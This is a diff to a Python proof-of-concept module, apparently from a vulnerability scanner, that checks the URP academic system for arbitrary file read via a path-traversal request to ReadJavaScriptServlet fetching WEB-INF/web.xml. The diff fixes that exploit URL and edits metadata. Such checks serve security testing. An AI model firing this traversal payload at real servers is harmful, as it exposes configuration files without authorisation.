@@ -11,17 +11,17 @@ class Vuln(ABVuln):
     type = VulnType.LFI # 漏洞类型
     disclosure_date = '2014-06-22'  # 漏洞公布时间
     desc = '''
-        URP综合教务系统任意文件读取and未授权访问
+        URP综合教务系统 /servlet/com.runqian.base.util.ReadJavaScriptServlet?file= 任意文件读取and未授权访问。
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=054350' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=054350
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = 'URP教务系统'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = 'URP_0008' # 平台 POC 编号，留空
+    poc_id = '00a15405-a9c3-48bb-9489-8bfba35bf096'
     author = '国光'  # POC编写者
     create_date = '2018-05-25' # POC创建时间
 
@@ -34,7 +34,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             #文件读取
-            url=arg+"servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
+            url=arg+"/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
             code,head,res,errcode,_=hh.http(url)
             if code==200 and "<?xml" in res and '<web-app>' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -51,7 +51,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 
 if __name__ == '__main__':
